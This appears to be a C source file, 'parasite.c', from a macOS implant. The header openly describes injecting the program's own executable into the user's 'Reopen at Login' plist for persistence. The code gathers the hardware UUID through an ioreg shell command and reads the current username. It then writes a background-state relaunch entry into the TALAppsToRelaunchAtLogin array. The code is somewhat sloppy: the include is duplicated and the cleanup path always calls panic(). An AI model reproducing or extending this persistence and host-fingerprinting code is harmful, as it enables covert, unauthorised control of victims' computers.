/*
+ * File:        parasite.c
+ *   Implements the routines and login-item persistence
+ *   for macOS. Key:
+ *     – Command execution wrapper (execute_command)
+ *     – CFURL creation from file system paths
+ *     – Platform data retrieval (UUID, current user)
+ *     – Login-item plist manipulation for persistence
+ *
+ * Sections:
+ *   • Util        – execute_command, create_file_url
+ *   • Platform    – get_platform_uuid, get_username
+ *   • Public API  – get_device_id, get_current_user
+ *   • Persistence – update_persistence (login items)
+ *
+ * Dependencies:
+ *   <wisp.h>      – panic(), find_self()
+ *   CoreFoundation – CFURL/CFPropertyList APIs
+ *
+ * Usage:
+ *   • Call get_device_id()/get_current_user() to enumerate host info.
+ *   • Call update_persistence(plist_path) to inject your executable
+ *     into the user’s “Reopen at Login” list.
+ *
+ * Notes:
+ *   – All CF objects are released before exit.
+ *   – Returned C strings must be freed by the caller.
+ *   – On any failure, panic() is called.
+ */
    #include <wisp.h>
    #include <wisp.h>

/* ----------------------------
   Util
   ---------------------------- */
__attribute__((always_inline)) 
static inline char *execute_command(const char *cmd) {
    if (!cmd) return NULL;
    
    FILE *pipe = popen(cmd, "r");
    if (!pipe) return NULL;
    
    char buffer[128] = {0};
    char *result = NULL;
    
    if (fgets(buffer, sizeof(buffer), pipe)) {
        buffer[strcspn(buffer, "\n")] = '\0';
        result = strdup(buffer);
    }
    
    pclose(pipe);
    return result;
}

/**
 * Creates CFURL from filesystem path
 */
__attribute__((always_inline)) 
static inline CFURLRef create_file_url(const char *path) {
    if (!path) return NULL;
    return CFURLCreateFromFileSystemRepresentation(
        NULL, 
        (const UInt8 *)path, 
        strlen(path), 
        false
    );
}

/* ----------------------------
   Platform
   ---------------------------- */
static char *get_platform_uuid(void) {
    const char *uuid_cmd = "ioreg -rd1 -c IOPlatformExpertDevice | "
                           "awk -F'\"' '/IOPlatformUUID/{print $4}'";
    return execute_command(uuid_cmd);
}

/**
 * Gets current username from environment
 */
static char *get_username(void) {
    const char *user = getenv("USER");
    return user ? strdup(user) : NULL;
}

/* ----------------------------
   Public
   ---------------------------- */
char *get_device_id(void) {
    return get_platform_uuid();
}

char *get_current_user(void) {
    return get_username();
}

/* ----------------------------
   Persistence 
   ---------------------------- */
void update_persistence(const char *plist_path) {
    if (!plist_path) return;
    
    // Initialize all resources to NULL for proper cleanup
    char *exePath = NULL;
    CFURLRef fileURL = NULL;
    CFPropertyListRef propertyList = NULL;
    CFMutableDictionaryRef newApp = NULL;
    CFDataRef plistData = NULL;
    
    // Get executable path using new wrapper function
    uint32_t bufsize = 0;
    if (find_self(NULL, &bufsize) != 0) goto clean;
    if (!(exePath = malloc(bufsize))) goto clean;
    if (find_self(exePath, &bufsize) != 0) goto clean;
    
    // Create file URL
    if (!(fileURL = create_file_url(plist_path))) goto clean;
    
    // Load existing plist or create new
    CFDataRef existingData = NULL;
    if (CFURLCreateDataAndPropertiesFromResource(NULL, fileURL, &existingData, NULL, NULL, NULL)) {
        propertyList = CFPropertyListCreateWithData(
            NULL, 
            existingData,
            kCFPropertyListMutableContainers, 
            NULL, 
            NULL
        );
        CFRelease(existingData);
    }
    
    if (!propertyList) {
        propertyList = CFDictionaryCreateMutable(
            kCFAllocatorDefault, 
            0,
            &kCFTypeDictionaryKeyCallBacks, 
            &kCFTypeDictionaryValueCallBacks
        );
    }
    
    // Get or create apps array
    CFMutableArrayRef apps = (CFMutableArrayRef)CFDictionaryGetValue(
        propertyList, 
        CFSTR("TALAppsToRelaunchAtLogin")
    );
    
    if (!apps) {
        apps = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        CFDictionarySetValue(
            (CFMutableDictionaryRef)propertyList,
            CFSTR("TALAppsToRelaunchAtLogin"), 
            apps
        );
        CFRelease(apps);
        apps = (CFMutableArrayRef)CFDictionaryGetValue(
            propertyList, 
            CFSTR("TALAppsToRelaunchAtLogin")
        );
    }
    
    // Create new app entry
    newApp = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 
        3,
        &kCFTypeDictionaryKeyCallBacks, 
        &kCFTypeDictionaryValueCallBacks
    );
    
    int state = 2;  // Background state
    CFNumberRef bgState = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &state);
    CFDictionarySetValue(newApp, CFSTR("BackgroundState"), bgState);
    CFRelease(bgState);
    
    CFStringRef exePathStr = CFStringCreateWithCString(
        kCFAllocatorDefault, 
        exePath,
        kCFStringEncodingUTF8
    );
    CFDictionarySetValue(newApp, CFSTR("Path"), exePathStr);
    CFRelease(exePathStr);
    
    CFArrayAppendValue(apps, newApp);
    
    // Write updated plist
    plistData = CFPropertyListCreateData(
        kCFAllocatorDefault, 
        propertyList,
        kCFPropertyListXMLFormat_v1_0, 
        0, 
        NULL
    );
    
    if (plistData) {
        FILE *plistFile = fopen(plist_path, "wb");
        if (plistFile) {
            fwrite(
                CFDataGetBytePtr(plistData), 
                sizeof(UInt8),
                CFDataGetLength(plistData), 
                plistFile
            );
            fclose(plistFile);
        }
        CFRelease(plistData);
    }

clean:
    panic();
}